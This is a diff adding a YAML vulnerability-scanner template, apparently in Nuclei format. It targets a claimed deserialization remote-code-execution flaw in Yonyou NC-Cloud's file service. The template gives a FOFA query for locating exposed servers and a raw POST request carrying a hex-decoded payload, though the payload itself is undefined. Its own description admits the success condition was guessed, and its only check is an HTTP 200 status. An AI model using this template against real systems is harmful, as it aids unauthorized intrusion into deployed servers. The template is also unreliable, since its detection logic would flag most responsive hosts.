@@ -1,0 +1,34 @@
+id: poc-50c5b3fe675a02b21044
+info:
+  name: 用友NC-Cloudfiles存在反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/50c5b3fe675a02b210443b4fca25fe16
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 50c5b3fe675a02b210443b4fca25fe16
+    fofa: + fofa`app="用友-NC-Cloud"`
+http:
+- raw:
+  - 'POST /fs/service/default/files/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 1354
+
+    Accept-Encoding: gzip, deflate
+
+
+    {{hexd(payload)}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
